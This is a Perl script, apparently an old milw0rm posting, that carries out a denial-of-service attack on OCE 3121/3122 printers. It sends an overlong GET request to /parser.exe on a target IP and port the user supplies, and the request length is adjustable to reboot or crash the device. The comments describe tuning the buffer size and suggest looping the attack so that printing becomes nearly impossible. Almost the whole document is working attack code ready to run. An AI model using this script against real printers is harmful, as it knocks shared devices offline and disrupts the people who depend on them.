#!/usr/bin/perl
#
#OCE 3121/3122 Printer DoS Exploit
#----------------------------
#By Herman Groeneveld aka sh4d0wman
#trancelover75 [AT] gmail.com
#
#Description: the printer runs a webserver to provide various printing tasks from
#java enabled browsers. Input is being filtered for bad characters.
#However it is vulnerable to a long url request. This will either reboot or crash the device.
#
#On crash, the "system" led on the printer changes from green to orange. No further printing is done
#until somebody resets the printer by flipping the powerswitch. E675 error displayed in printer display.
#On reboot, printing resumes after the device has completed it's reboot cycle.
#
#Crash is hard to accomplish. Play with the buffer input size. 261 worked at my printer. 
#Values of 250/500/50000 are known to reboot the printer. No reliable size for crashing yet.
#
#Loop this exploit and printing will be nearly impossible. Tested: unhappy users. Not implemented. 
#
#If you test this on your device, pls let me know the result. I had just 1 printer to test it at ;)
#
#Discovered: 29/03/2006
#Target: tested against OCE 3121/3122 printer. 
#Vendor: www.oce.com (no response)

	use IO::Socket;

	if (@ARGV != 3)
	{
	print "                                        			      \n";
	print "   	#OCE 3121/3122 Printer DoS Exploit#  		      \n";
	print "---------------------------------------------------------------\n";
	print " Usage: crashoce.pl <target ip> <target port> <request length> \n";
	print " Example: new.pl 127.0.0.1 80 250 		              \n";
	print " Play with request length for reboot or crash effect. 	      \n\n";
	print "      	#Coded by sh4d0wman 31/03/2006#			      \n";
	exit(1);
	}	

	$targetip =$ARGV[0]; #user input, no much fun in attacking 127.0.0.1 is it?
	$targetport =$ARGV[1]; #user input since vendor might change this some day, unlikely though  :-)
	$reqlength = $ARGV[2]; #user input since different sizes give different results

	print "[-] OCE 3122 Printer DoS Exploit\n\n";
	print "[-] Target IP: ";
	print $targetip;
	print "\n[-] Connecting to target IP...\n";

$socket = IO::Socket::INET->new(
	Proto => "tcp",
	PeerAddr => "$targetip",
	PeerPort => "$targetport"); unless ($socket) { die "- Could not connect. Check IP & 		port. Hint: default port is 80!\n"}

print "[-] Connected to printer\n\n";

print "[-] Creating DoS request...\n";

$bufa='A'x$reqlength; #creating payload, length based on user input

print "[-] Sending request...\n\n";

print $socket "GET /parser.exe?".$bufa.".html"." HTTP/1.1\r\n\r\n";
	sleep 5; #Be advised! Printer reaction to exploit can take up to 30 sec. Pls, be patient...

print "[>]Attack completed! Printer in error state or rebooting.\n";
close($socket);

# milw0rm.com [2006-04-26]
